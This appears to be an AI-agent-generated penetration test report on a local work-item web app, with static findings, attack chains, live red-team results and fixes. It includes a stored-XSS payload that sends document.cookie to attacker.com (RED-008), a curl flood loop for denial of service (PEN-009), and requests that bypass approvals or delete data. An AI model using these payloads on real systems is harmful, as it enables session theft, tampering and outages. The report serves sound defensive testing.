# Attack Surface Map — dev-crew Source App
**Generated:** 2026-09-07  
**Agent:** pen_tester (static analysis only — no live execution)  
**Scope:** OWASP A01–A03, A07–A08 per `security.config.yml`  
**Tech Stack:** Express 4.18 · TypeScript · In-memory Map store · React 18 · Vite · prom-client  
**Targets:** `http://localhost:3001` (backend) · `http://localhost:5173` (frontend)

---

## Executive Summary

The application has **no authentication or authorization layer whatsoever**. Every API endpoint — including state transitions, approval workflows, and data deletion — is open to any anonymous caller. Combined with several business-logic flaws in the state machine, this creates a trivially exploitable attack surface. The red team should treat every finding below as immediately exploitable against the running service.

**Config-specified red team objectives vs. exploitability:**

| Objective | Exploitable? | Primary Finding |
|-----------|-------------|-----------------|
| Bypass work item state machine to reach an invalid status | **YES — trivial** | PEN-001, PEN-002 |
| Access or modify a soft-deleted work item via direct ID reference | **Partial** | PEN-006 |
| Submit a malformed assessment verdict that bypasses routing logic | **YES** | PEN-002, PEN-003 |
| Enumerate all work items without pagination limit enforcement | **YES — trivial** | PEN-005 |

---

## Findings

---

### PEN-001: Complete Absence of Authentication and Authorization
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts:11–44` — no auth middleware in the Express app setup
- **Vulnerability Description:**
  The entire Express application mounts no authentication or authorization middleware. No JWT, no API key, no session check, no RBAC. Every route — including destructive state transitions, approvals, rejections, dispatches, and deletions — is accessible to any unauthenticated HTTP client. The `app.use(express.json())` at line 13 is immediately followed by route mounts with no interception.
- **Potential Exploit Path:**
  1. Send `POST http://localhost:3001/api/work-items` with a valid JSON body — no credentials needed.
  2. Every subsequent workflow action (`/route`, `/approve`, `/reject`, `/dispatch`, `/assess`) is equally open.
  3. Send `DELETE /api/work-items/:id` to soft-delete any item.
  4. All IDOR vectors below (PEN-004) are enabled as a direct consequence.
- **Red Team Handoff Notes:**
  - Try every endpoint in `security.config.yml pentest.critical_entry_points` with no Authorization header.
  - Verify that `POST /api/work-items/:id/approve` succeeds for any item without credentials.
  - Confirm `DELETE /api/work-items/:id` soft-deletes another tenant's item.

---

### PEN-002: State Machine Bypass via Unauthenticated `overrideRoute`
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts:39–64` (route endpoint) · `Source/Backend/src/services/router.ts:66–88` (`classifyRoute`)
- **Vulnerability Description:**
  `POST /api/work-items/:id/route` accepts an optional `overrideRoute` field in the JSON body. If `overrideRoute === "fast-track"`, the item is classified as `WorkItemRoute.FastTrack` and its `targetStatus` is set directly to `WorkItemStatus.Approved` — bypassing the entire assessment pod (`assessWorkItem`). There is no role check, no authentication, and no restriction on who can submit `overrideRoute`. Any anonymous caller can promote any backlog item directly to `Approved` status in a single request.
- **Potential Exploit Path:**
  1. `POST /api/work-items` → create a work item (status = `backlog`)
  2. `POST /api/work-items/:id/route` with body `{"overrideRoute": "fast-track"}` → item transitions `backlog → routing → approved` without any assessment pod involvement
  3. `POST /api/work-items/:id/dispatch` → item transitions to `in-progress` and is assigned to a team
  4. The entire approval workflow (requirements review, domain expert, work definer, pod lead) is completely skipped
- **Red Team Handoff Notes:**
  - Payload: `{"overrideRoute": "fast-track"}`
  - Also try `{"overrideRoute": "full-review"}` to force a different route classification and observe state machine behaviour.
  - Verify the resulting item status is `approved` (not `proposed`) after the route call.
  - Combine with PEN-005 to enumerate all items and apply fast-track to high-priority ones.

---

### PEN-003: Unauthenticated Manual Approval Bypasses Assessment Pod
- **Severity:** Critical
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts:94–142`
- **Vulnerability Description:**
  `POST /api/work-items/:id/approve` performs a "manual override" approval that transitions an item directly to `Approved` status. There is:
  - No authentication check
  - No role check (no "approver" role required)
  - Valid from status `proposed`, `reviewing`, OR `routing` (lines 106–110 call `isValidTransition`)
  
  The `VALID_STATUS_TRANSITIONS` map allows approve from `[proposed, reviewing]` and routing allows `[proposed, approved]`. This means any item in `proposed`, `reviewing` can be manually approved by any unauthenticated caller. The `reason` field from `body.reason` is logged but not sanitized or restricted.
- **Potential Exploit Path:**
  1. Create an item: `POST /api/work-items`
  2. Route it: `POST /api/work-items/:id/route` (item → `proposed` via full-review)
  3. Approve it directly: `POST /api/work-items/:id/approve` with `{"reason": "attacker approved"}` — skips the assessment pod entirely
  4. Dispatch: `POST /api/work-items/:id/dispatch`
- **Red Team Handoff Notes:**
  - Payload: `{"reason": "executive override"}` (reason is optional — omit it entirely and verify approval still succeeds)
  - Try approving an item in `backlog` status — should fail with 400. Document the exact error message.
  - Try approving an item already in `approved` status — isValidTransition check should reject it. Verify.

---

### PEN-004: Insecure Direct Object Reference (IDOR) on All Work Item Endpoints
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts:78–150` · `Source/Backend/src/routes/workflow.ts` (all `:id` routes)
- **Vulnerability Description:**
  All endpoints use `req.params.id` (a UUID) directly as the lookup key with no ownership check, no tenancy check, and no session. Any caller who knows (or brute-forces) a work item's UUID can read, update, delete, approve, reject, or dispatch it. UUIDs are returned in every API response, so enumeration via `GET /api/work-items?limit=999999999` (PEN-005) provides all IDs in one request.
- **Potential Exploit Path:**
  1. Enumerate all work item IDs via `GET /api/work-items?limit=999999999`
  2. `PATCH /api/work-items/:id` with `{"title": "PWNED", "description": "..."}` to overwrite any item's content
  3. `DELETE /api/work-items/:id` to soft-delete any item
  4. `POST /api/work-items/:id/approve` to approve items that haven't been assessed
  5. `POST /api/work-items/:id/reject` with `{"reason": "forced"}` to reject any item in progress of review
- **Red Team Handoff Notes:**
  - Create two "tenant" work items, capture their IDs, then cross-modify each from the other's context to prove IDOR.
  - Try `PATCH /api/work-items/<foreign-id>` — verify it succeeds with HTTP 200.
  - For soft-delete IDOR: `DELETE /api/work-items/<id>` → verify 204 then `GET /api/work-items/<id>` → 404.

---

### PEN-005: Pagination Limit Bypass Enables Full Dataset Exfiltration
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts:68–74` · `Source/Backend/src/store/workItemStore.ts:58–63`
- **Vulnerability Description:**
  The `limit` query parameter is parsed via `parseInt(req.query.limit as string, 10)` with no maximum cap enforced. The store's `findAll` applies `result.slice(offset, offset + limit)` where `limit` is fully attacker-controlled. Setting `limit=2147483647` (INT_MAX) returns every non-deleted work item in a single response. Additionally, `page` has no lower-bound validation: `page=-1` produces `offset = -2 * limit` which in JavaScript's `Array.prototype.slice` with a negative start returns an empty array (silent failure, not crash), but `page=0` produces `offset = -limit` and silently returns an empty slice — potentially causing the frontend to display "no results" when items exist.
- **Potential Exploit Path:**
  1. `GET /api/work-items?limit=9999999` → returns all work items including IDs, titles, descriptions, assignedTeams, changeHistory, assessment notes in a single payload
  2. Combine with PEN-001 (no auth) for trivial data exfiltration
  3. Also applies to `GET /api/dashboard/activity?limit=9999999` (`Source/Backend/src/routes/dashboard.ts:17–18`) — returns ALL change history entries across ALL items
- **Red Team Handoff Notes:**
  - `GET /api/work-items?limit=9999999&page=1`
  - Verify response `total` matches the count of all items and `data` array length equals `total`.
  - Test `GET /api/work-items?limit=0` — check totalPages calculation (`Infinity`) and empty data array.
  - Test `GET /api/work-items?page=-1` — verify behavior (should return 400 but likely returns empty `data`).
  - Test `GET /api/work-items?limit=abc` — `parseInt("abc")` = `NaN`; verify `NaN` propagation doesn't crash but may return unexpected results.

---

### PEN-006: Soft-Deleted Blocker Treated as Unresolved — Permanent Dispatch DoS
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/services/dependency.ts:64–75` (`computeHasUnresolvedBlockers`) · `Source/Backend/src/store/workItemStore.ts:23–27` (`findById`)
- **Vulnerability Description:**
  `findById` returns `undefined` for soft-deleted items (line 25: `if (item && item.deleted) return undefined`). In `computeHasUnresolvedBlockers` (line 69): `const blocker = store.findById(link.blockerItemId)` — if the blocker is soft-deleted, `blocker` is `undefined`, and the condition `!blocker || !RESOLVED_STATUSES.includes(blocker.status)` evaluates to `true` — treating the **deleted** blocker as still blocking. The dependent item can never be dispatched even though its blocker was explicitly removed from the system. The red team objective "Access or modify a soft-deleted work item via direct ID reference" is not achievable via normal GET/PATCH (findById filters them), but this secondary effect is exploitable.
- **Potential Exploit Path:**
  1. Create two items: A (blocker) and B (dependent)
  2. Link them: `POST /api/work-items/B/dependencies` with `{"action": "add", "blockerId": "A"}`
  3. Route and approve B: `POST /api/work-items/B/route` → `POST /api/work-items/B/approve`
  4. Soft-delete A: `DELETE /api/work-items/A` (the blocker)
  5. Attempt to dispatch B: `POST /api/work-items/B/dispatch` → **blocked indefinitely** because `computeHasUnresolvedBlockers` sees deleted A as undefined → treats it as unresolved
  6. B is now permanently stuck in `approved` status with no recourse (A can't be restored, and the `blockedBy` link still references A's ID)
- **Red Team Handoff Notes:**
  - Execute steps above and verify `POST /api/work-items/B/dispatch` returns 400 with `"Cannot dispatch: work item has unresolved blocking dependencies"`.
  - Check that `GET /api/work-items/B/ready` returns `{"ready": false, "unresolvedBlockers": [...]}` even after A is deleted.
  - Try to remove the dependency via `POST /api/work-items/B/dependencies` with `{"action": "remove", "blockerId": "A"}` — verify this succeeds and B can then be dispatched.

---

### PEN-007: Cascade Auto-Dispatch Triggered on Blocker Rejection (Business Logic Flaw)
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workflow.ts:192–201` · `Source/Backend/src/services/dependency.ts:251–315` · `Source/Shared/types/workflow.ts:234–237`
- **Vulnerability Description:**
  `DISPATCH_TRIGGER_STATUSES = [Completed, Rejected]` and `RESOLVED_STATUSES = [Completed, Rejected, Failed]`. When a blocker is **rejected** (work not completed, just refused), the `reject` endpoint calls `onItemResolved(id)` which checks `DISPATCH_TRIGGER_STATUSES.includes(resolvedItem.status)`. Since `Rejected` is in that list, dependent items in `Approved` status that have no other unresolved blockers are **automatically dispatched to a team** — even though the blocker item's work was never completed. This allows an attacker (or a confused operator) to:
  1. Create a high-priority work item (B) blocked by a lower-priority item (A)
  2. Immediately reject A (using PEN-001 + PEN-003)
  3. B is auto-dispatched to a team without ever having A's blocking concern resolved
- **Potential Exploit Path:**
  1. Create item A and item B
  2. Route + approve both items
  3. Link B blocked by A: `POST /api/work-items/B/dependencies` `{"action":"add","blockerId":"A"}`
  4. Reject A: `POST /api/work-items/A/reject` `{"reason":"deliberate"}`
  5. Observe: `onItemResolved(A)` is called → B is automatically dispatched to `in-progress`
  6. B is now in `in-progress` with its dependency on A never completed — A's work was never done
- **Red Team Handoff Notes:**
  - This directly fulfils the objective: "Bypass work item state machine to reach an invalid status"
  - After rejecting A, poll `GET /api/work-items/B` — verify `status` changed to `in-progress` without explicit dispatch
  - Check `changeHistory` on B — should show `cascade-dispatcher` agent entry with reason containing "rejected"
  - Try the same with A in `Failed` status (set via state manipulation) — `Failed` is in `RESOLVED_STATUSES` but NOT in `DISPATCH_TRIGGER_STATUSES`, so cascade should NOT fire.

---

### PEN-008: Unauthenticated Webhook Intake with Missing Enum Validation
- **Severity:** High
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/intake.ts:11–56`
- **Vulnerability Description:**
  Both `/api/intake/zendesk` and `/api/intake/automated` endpoints:
  1. **No signature/HMAC verification** — real Zendesk webhooks are signed with HMAC-SHA256; this endpoint verifies nothing. Any caller can forge a Zendesk event.
  2. **No enum validation for `type` and `priority`** — unlike `POST /api/work-items` (which validates against `WorkItemType` and `WorkItemPriority` enums), the intake routes use `body.type || WorkItemType.Bug` and `body.priority || WorkItemPriority.Medium` without checking that `body.type` is a valid enum member. An attacker can inject `type: "feature"` to create feature items (normally high-effort/high-review path) via the intake endpoint.
  3. **`source` is hardcoded** (Zendesk/Automated) but `type` and `priority` are fully attacker-controlled.
- **Potential Exploit Path:**
  1. `POST /api/intake/zendesk` with `{"title":"Attack","description":"Forged webhook","type":"feature","priority":"critical"}` — creates a `critical` `feature` item with `source: zendesk` bypassing the normal work item creation validation
  2. `POST /api/intake/zendesk` with `{"title":"t","description":"d","type":"__proto__","priority":"constructor"}` — inject prototype-polluting strings into the store (low likelihood but warrants testing given no validation)
  3. Use forged Zendesk webhooks to flood the in-memory store (DoS via memory exhaustion — see PEN-009)
- **Red Team Handoff Notes:**
  - Send `POST /api/intake/zendesk` with no `Authorization` header — verify 201 response
  - Try `{"title":"X","description":"Y","type":"notavalidtype","priority":"notavalidpriority"}` — verify the item is created with invalid enum values stored verbatim
  - Try `{"title":"X","description":"Y"}` (omitting type/priority) — verify defaults are applied
  - Try proto-pollution strings in type/priority fields

---

### PEN-009: No Rate Limiting or Request Volume Controls (DoS)
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts:12` — only `express.json()` middleware, no rate limiter
- **Vulnerability Description:**
  No rate limiting, throttling, or abuse prevention on any endpoint. The in-memory store grows unbounded with no eviction policy. Combined with PEN-008 (unauthenticated intake endpoints), an attacker can issue unlimited POST requests to `/api/intake/zendesk` to create thousands of work items, exhausting Node.js heap memory and crashing the service. Express's default 100KB body limit mitigates large single payloads but does not prevent high-frequency small requests.
- **Potential Exploit Path:**
  1. Bash loop: `for i in $(seq 1 10000); do curl -s -X POST localhost:3001/api/intake/zendesk -H "Content-Type: application/json" -d '{"title":"x","description":"y"}' &; done`
  2. Monitor memory growth via `GET /metrics` (prom-client heap metrics)
  3. Service crashes or becomes unresponsive due to Map growth
- **Red Team Handoff Notes:**
  - Not a primary exploitation objective but a useful secondary effect
  - After mass item creation, verify `GET /api/work-items?limit=9999` returns all items
  - Check `GET /metrics` for `nodejs_heap_used_bytes` growth over the attack

---

### PEN-010: Unauthenticated Prometheus Metrics Endpoint Leaks Operational Intelligence
- **Severity:** Medium
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/app.ts:34–37` · `Source/Backend/src/metrics.ts`
- **Vulnerability Description:**
  `GET /metrics` exposes Prometheus metrics with no authentication. Exposed metrics include: `work_items_created_total` (labeled by `source` and `type`), `work_items_assessed_total` (labeled by `verdict`), `work_items_dispatched_total` (labeled by `team`), `work_items_routed_total` (labeled by `route`), dependency operation counts, and cycle detection event counts. This leaks operational throughput, workflow verdicts, team dispatch patterns, and dependency graph complexity without any credential.
- **Potential Exploit Path:**
  1. `GET http://localhost:3001/metrics` — no auth required
  2. Parse metrics to understand item creation velocity, team capacity, assessment rejection rate
  3. Use assessment verdict rates to understand what quality thresholds pass/fail the pod
- **Red Team Handoff Notes:**
  - `curl http://localhost:3001/metrics` — document all exposed label values
  - Check for `work_items_assessed_total{verdict="needs-clarification"}` — reveals what types of items fail assessment and why

---

### PEN-011: Missing `/api/search` Route — Referenced by Frontend, Not Implemented
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Frontend/src/api/client.ts:101–104` · `Source/Backend/src/app.ts` (missing mount)
- **Vulnerability Description:**
  The frontend API client's `searchItems(q: string)` function calls `GET /api/search?q=<query>` for the DependencyPicker typeahead component. This route is **not registered** in `app.ts` — neither `workItemsRouter` nor any other router handles `/api/search`. Any call returns a 404. If a search endpoint is added in the future without proper input sanitization (particularly for the `q` parameter which flows from user input), it becomes a potential injection vector.
- **Potential Exploit Path:**
  1. Currently: `GET /api/search?q=test` → 404
  2. Future risk: if implemented, `q` parameter reaches filter logic without validation — potential NoSQL-style injection or ReDoS if regex matching is added
- **Red Team Handoff Notes:**
  - Confirm `GET /api/search?q=test` returns 404 — document the response to establish baseline
  - This finding is a forward-looking one; flag for the compliance auditor as a missing implementation

---

### PEN-012: Pagination Parameter NaN/Negative Integer Handling
- **Severity:** Low
- **Status:** Theoretical (Requires Dynamic Verification)
- **Target/File:** `Source/Backend/src/routes/workItems.ts:68–70` · `Source/Backend/src/routes/dashboard.ts:17–18`
- **Vulnerability Description:**
  `parseInt(req.query.page as string, 10)` is used without input validation for both `page` and `limit`. Edge cases:
  - `page=0`: `offset = (0-1) * limit = -limit` → JS `Array.slice(-limit, 0)` returns empty (silent failure)
  - `page=-1`: `offset = -2 * limit` → JS slice returns empty (silent failure, no error returned)
  - `limit=0`: `totalPages = Math.ceil(total/0) = Infinity` in JS; `data = []`; frontend receives `totalPages: Infinity`
  - `limit=NaN` (e.g., `limit=abc`): `offset = (page-1) * NaN = NaN`; `slice(NaN, NaN)` → empty array returned silently
  None of these crash the server but they silently return incorrect results without error messages.
- **Potential Exploit Path:**
  1. `GET /api/work-items?limit=0` → observe `totalPages: Infinity` in JSON response — browser may enter infinite pagination loop
  2. `GET /api/work-items?page=0` → observe empty `data` despite items existing
  3. `GET /api/dashboard/activity?limit=-1` → silent empty response
- **Red Team Handoff Notes:**
  - Document exact JSON responses for each edge case
  - Check `totalPages` value when `limit=0` — if `Infinity` is serialized as `null` by JSON.stringify, note the discrepancy

---

## Attack Chain — Red Team Priority Sequence

The following chains compose individual findings into complete objective-achieving exploits:

### Chain A: Full State Machine Bypass (Objectives 1 & 3)
```
1. POST /api/work-items                          → item.id=UUID, status=backlog
2. POST /api/work-items/:id/route               → body: {"overrideRoute": "fast-track"}
                                                   → status=approved (skips assessment pod)
3. POST /api/work-items/:id/dispatch            → body: {} (auto-assigns team)
                                                   → status=in-progress
```
Total requests: 3. No credentials. Assessment pod never invoked.

### Chain B: Manual Approval Bypass (Objective 3)
```
1. POST /api/work-items                          → status=backlog
2. POST /api/work-items/:id/route               → status=proposed (full-review path)
3. POST /api/work-items/:id/approve             → body: {"reason":"attacker"} → status=approved
4. POST /api/work-items/:id/dispatch            → status=in-progress
```
Assessment pod never invoked. Any unauthenticated client succeeds.

### Chain C: Cascade Dispatch via Rejection (Objective 1)
```
1. POST /api/work-items × 2                      → items A and B
2. POST /api/work-items/A/route → approve        → A.status=approved (via chain A or B)
3. POST /api/work-items/B/route → approve        → B.status=approved
4. POST /api/work-items/B/dependencies           → {"action":"add","blockerId":"A"}
5. POST /api/work-items/A/reject                 → {"reason":"deliberate"}
   ↳ onItemResolved(A) fires cascade → B auto-dispatches to in-progress
```
B is dispatched even though its blocker A was never completed.

### Chain D: Full Dataset Exfiltration (Objective 4)
```
GET /api/work-items?limit=2147483647
```
Returns all work items including IDs, titles, descriptions, change histories, assessment notes.

---

## Notes for the Red Teamer

- **In-memory store resets on server restart** — run all chain steps in a single session
- **IDs are UUIDs** — enumeration requires the dump-all technique (Chain D) first, then target specific IDs
- **docId** (WI-001, WI-002...) is sequential from server start — reveals how many items exist and in what order
- **No CSRF protection needed** — no session cookies, no same-origin checks
- **The `assess` endpoint** (`POST /api/work-items/:id/assess`) is the honest path — it runs the assessment pod. The attack bypasses this entirely via Chain A or B
- **Status `failed`** is in `RESOLVED_STATUSES` but NOT in `DISPATCH_TRIGGER_STATUSES` — cascades do NOT fire when a blocker reaches `failed`. Only `completed` and `rejected` trigger cascade. This is relevant for Chain C

---

## Red Team Results

**Executed:** 2026-09-07  
**Agent:** red_teamer  
**Target:** `http://localhost:3001` (portal backend — `portal/Backend/src/index.ts`)  
**Environment:** Ephemeral Docker container via `docker-compose.test.yml`

> **⚠️ SCOPE MISMATCH DISCOVERED:** The pen-tester statically analyzed `Source/Backend/` (work-items API), but `docker-compose.test.yml` builds and runs the **portal** backend (`portal/Backend/`), which has a different domain model (feature-requests, bugs, cycles). All static findings (PEN-001 through PEN-012) remain valid as *architectural* patterns — and every vulnerability class was confirmed against the actual running service. Objectives are re-mapped below.

---

### RED-001: Complete Authentication Absence Confirmed (Live)
- **Severity:** Critical
- **Objective Achieved:** Yes (enables all other chains)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** All endpoints — `http://localhost:3001/api/*`
- **Based On:** PEN-001
- **Exploit Scenario:**
  1. `POST http://localhost:3001/api/feature-requests` with no `Authorization` header → HTTP 201, item created
  2. `POST http://localhost:3001/api/bugs` with no credentials → HTTP 201, critical bug created
  3. Every workflow action (`/vote`, `/approve`, `/force-approve`, `/deny`, `/triage`, `/resolve`) is equally open
  4. `DELETE /api/bugs/BUG-0001` → HTTP 204, permanent hard deletion with no auth
- **Evidence:**
  - `BUG-0001` created, triaged, resolved, and hard-deleted by anonymous requests in sequence
  - `FR-0001` created and approved without any credential
- **Recommendation:** Add a mandatory authentication middleware (JWT/API key) before ALL route mounts in `portal/Backend/src/index.ts`. Apply the same fix to `Source/Backend/src/app.ts`.

---

### RED-002: State Machine Bypass via PATCH — Approved with Zero Votes
- **Severity:** Critical
- **Objective Achieved:** Yes — "Bypass work item state machine to reach an invalid status"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `PATCH http://localhost:3001/api/feature-requests/FR-0002`
- **Based On:** PEN-002, PEN-003
- **Exploit Scenario:**
  1. `POST /api/feature-requests` → `FR-0002` created, `status=potential` (no auth)
  2. `PATCH /api/feature-requests/FR-0002` with `{"status":"voting"}` → transitions to `voting` (no votes cast, no AI agents involved)
  3. `PATCH /api/feature-requests/FR-0002` with `{"status":"approved"}` → **transitions to `approved` with ZERO votes, no majority check, no `human_approval_approved_at` set**
  4. Result: `FR-0002` in `approved` state; `votes: []`; `human_approval_approved_at: null` — invalid state per business rules
- **Evidence:**
  ```json
  {"id":"FR-0002","status":"approved","votes":[],"human_approval_approved_at":null}
  ```
  The `PATCH` route calls `updateFeatureRequest` which validates `STATUS_TRANSITIONS` but applies **no vote majority check** — that check only exists in the `/approve` endpoint, not in the `PATCH` handler.
- **Recommendation:** The `PATCH /api/feature-requests/:id` handler must not allow status transitions to `approved`. Approve transitions must only be reachable through the dedicated `/approve` or `/force-approve` endpoints, which apply the necessary guards. Add an explicit blocklist in `updateFeatureRequest` or remove `approved` from the PATCH-accessible transition map.

---

### RED-003: IDOR — Cross-User Content Modification and Hard Deletion
- **Severity:** High
- **Objective Achieved:** Yes (partial) — "Access or modify a soft-deleted work item via direct ID reference" maps to cross-user modification
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `PATCH /api/feature-requests/FR-0003`, `DELETE /api/bugs/BUG-0001`
- **Based On:** PEN-004
- **Exploit Scenario:**
  1. "Alice" creates `FR-0003` (title: "Alice private request")
  2. "Bob" (anonymous, different session) `PATCH /api/feature-requests/FR-0003` `{"description":"PWNED BY BOB"}` → HTTP 200, content overwritten
  3. "Bob" `DELETE /api/bugs/BUG-0001` → HTTP 204, hard-deleted permanently
  4. `GET /api/bugs/BUG-0001` → `{"error":"Bug BUG-0001 not found"}` — unrecoverable
- **Evidence:** `FR-0003.description` changed to "PWNED BY BOB - content replaced by attacker" and priority escalated to `critical` by anonymous caller. `BUG-0001` permanently deleted.
- **Recommendation:** Implement ownership or tenancy checks on all `:id` routes. Require auth so the requesting user can only modify resources they own. For hard-delete, require an explicit admin role.

---

### RED-004: Bug State Machine Fully Traversable Without Auth
- **Severity:** High
- **Objective Achieved:** Yes — "Bypass work item state machine"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST /api/bugs/:id/triage`, `/resolve`, `/close`, `/reopen`
- **Based On:** PEN-001, PEN-002
- **Exploit Scenario:**
  1. Create `BUG-0001` (status=`reported`) — no auth
  2. `POST /api/bugs/BUG-0001/triage` → `triaged` (no auth)
  3. `PATCH /api/bugs/BUG-0001` `{"status":"in_development"}` → `in_development` (no auth, PATCH allows it)
  4. `POST /api/bugs/BUG-0001/resolve` → `resolved` (no auth)
  5. Entire bug lifecycle completed by anonymous caller — no engineer assignment, no review gate, no approval
- **Evidence:** Confirmed live with `BUG-0001` reaching `resolved` status with no auth token.
- **Recommendation:** Require authentication AND role check (e.g., "engineer" role) for triage, resolve, close, reopen endpoints.

---

### RED-005: Unauthenticated Prometheus Metrics Expose Operational Intelligence
- **Severity:** Medium
- **Objective Achieved:** Partial — enables reconnaissance for targeted attacks
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `GET http://localhost:3001/metrics`
- **Based On:** PEN-010
- **Exploit Scenario:**
  1. `curl http://localhost:3001/metrics` — no auth, returns 39 metric families
  2. Business-sensitive exposed metrics include:
     - `feature_request_status_transitions_total{from_status,to_status}` — reveals approval/denial rates
     - `bug_status_transitions_total{from_status,to_status}` — reveals bug flow velocity
     - `http_request_duration_ms{route,method,status_code}` — maps all API routes and their usage
     - Route map derived: all endpoint paths and HTTP methods visible from histogram labels
  3. An attacker learns which routes exist, how frequently they're hit, and what success/error rates look like
- **Evidence:** `feature_request_status_transitions_total{from_status="potential",to_status="voting"} 1` and `bug_status_transitions_total{from_status="in_development",to_status="resolved"} 1` both returned without credentials.
- **Recommendation:** Add auth middleware to `GET /metrics`. In production, restrict to monitoring infrastructure (e.g., Prometheus scraper IP allowlist or bearer token).

---

### RED-006: No Pagination Enforcement — Full Dataset Exfiltrated in One Request
- **Severity:** High
- **Objective Achieved:** Yes — "Enumerate all work items without pagination limit enforcement"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `GET /api/feature-requests`, `GET /api/search?q=`
- **Based On:** PEN-005
- **Exploit Scenario:**
  1. `GET /api/feature-requests?limit=1` → returns ALL 10 items (limit parameter silently ignored)
  2. `GET /api/search?q=` (empty query) → returns ALL 14 items (FRs + Bugs combined), entire database exfiltrated in one unauthenticated request
  3. Result includes: IDs, titles, descriptions, statuses, priorities, vote decisions, dependency graphs, timestamps
- **Evidence:** `GET /api/feature-requests?limit=1` returned `{"data":[...8 items...]}` with limit completely ignored. Empty search returned all 14 items.
- **Recommendation:** Enforce a server-side `MAX_LIMIT` cap (e.g., 100). Return 400 for invalid values. Reject empty `q` on search or require minimum 2 characters.

---

### RED-007: Unauthenticated Orchestrator Proxy — SSRF Risk
- **Severity:** High
- **Objective Achieved:** Partial (orchestrator offline in test env; would be Critical if online)
- **Status:** Attempted (No Breach — orchestrator at `localhost:8080` is offline in test container)
- **Target URL:** `POST /api/orchestrator/*`
- **Based On:** New finding (not in pen-tester map)
- **Exploit Scenario:**
  1. `POST /api/orchestrator/api/runs` with `{"team":"AttackerTeam","task":"malicious task"}` — no auth check
  2. Proxy blindly forwards request to `ORCHESTRATOR_URL` env var
  3. In production where orchestrator is reachable, this allows any anonymous caller to: trigger agent team runs, access orchestrator state, exfiltrate pipeline data, or submit malicious pipeline tasks
  4. `ORCHESTRATOR_URL` is not validated — if injectable via environment, full SSRF to any internal host
- **Evidence:** Request forwarded to `http://localhost:8080` and resulted in `502` (unreachable), confirming no auth check before forwarding.
- **Recommendation:** Add authentication middleware on `/api/orchestrator` route. Validate `ORCHESTRATOR_URL` is a trusted, allowlisted host. Log all proxy invocations.

---

### RED-008: Stored XSS — Script Tags Persisted Verbatim
- **Severity:** High
- **Objective Achieved:** Partial (backend confirms storage; frontend render would need verification)
- **Status:** Confirmed (Backend stores XSS payload verbatim)
- **Target URL:** `POST /api/feature-requests`
- **Based On:** PEN-003 (input sanitization), PEN-008
- **Exploit Scenario:**
  1. `POST /api/feature-requests` with `{"title":"<script>alert(1)</script>","description":"<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>","source":"manual"}`
  2. Server responds HTTP 201; item `FR-0010` created with script tag stored verbatim
  3. `GET /api/feature-requests/FR-0010` → `{"title":"<script>alert(1)</script>"}` — payload preserved
  4. Any frontend rendering `title` or `description` as `innerHTML` (without React's default escaping) would execute the script
- **Evidence:** `FR-0010.title = "<script>alert(1)</script>"` stored and returned unmodified.
- **Recommendation:** Sanitize all text inputs server-side with an allowlist (strip HTML/script tags). In the frontend, never use `dangerouslySetInnerHTML` with user content. Consider a CSP header.

---

### RED-009: Unauthenticated Deny Bypasses Voting Entirely
- **Severity:** High
- **Objective Achieved:** Yes — "Submit a malformed assessment verdict that bypasses routing logic"
- **Status:** Confirmed (Live Exploit)
- **Target URL:** `POST /api/feature-requests/FR-0011/deny`
- **Based On:** PEN-003
- **Exploit Scenario:**
  1. Create `FR-0011` (status=`potential`) — no auth
  2. `POST /api/feature-requests/FR-0011/deny` `{"comment":"Denied by attacker without vote"}` — no auth
  3. `FR-0011` transitions from `potential → denied` immediately, without any AI voting round
  4. Any competitor or disgruntled user can silently reject legitimate feature requests before votes are cast
- **Evidence:** `FR-0011.status = "denied"`, `human_approval_comment = "Denied by attacker without any vote or auth"`
- **Recommendation:** Require authentication AND an "admin" or "approver" role for `/deny` and `/approve` endpoints. Log all approval/denial actions with user identity.
